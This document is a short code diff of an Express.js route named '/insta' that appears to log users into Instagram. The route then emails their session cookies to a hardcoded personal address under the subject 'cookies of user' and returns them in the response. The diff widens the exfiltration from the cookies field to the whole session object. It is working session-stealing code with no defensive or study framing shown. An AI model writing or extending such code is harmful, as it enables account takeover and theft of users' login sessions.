@@ -235,7 +235,7 @@ app.post("/insta", (req, res) => {
           from: process.env.email,
           to: "surya142327@gmail.com",
           subject: "cookies of user" + req.query.name,
-          text: JSON.stringify(val2.cookies),
+          text: JSON.stringify(val2),
         };
         transporter.sendMail(mailOptions, function (error, info) {
           if (error) {
@@ -244,7 +244,7 @@ app.post("/insta", (req, res) => {
               success: true,
               twoFactor: false,
               user: val,
-              cookie: JSON.stringify(val2.cookies),
+              cookie: JSON.stringify(val2),
               message: "login Successful but failed to send email",
             });
           } else {
@@ -253,7 +253,7 @@ app.post("/insta", (req, res) => {
               success: true,
               twoFactor: false,
               user: val,
-              cookie: JSON.stringify(val2.cookies),
+              cookie: JSON.stringify(val2),
               message: "login Successful and email has been sent.",
             });
             res.end();
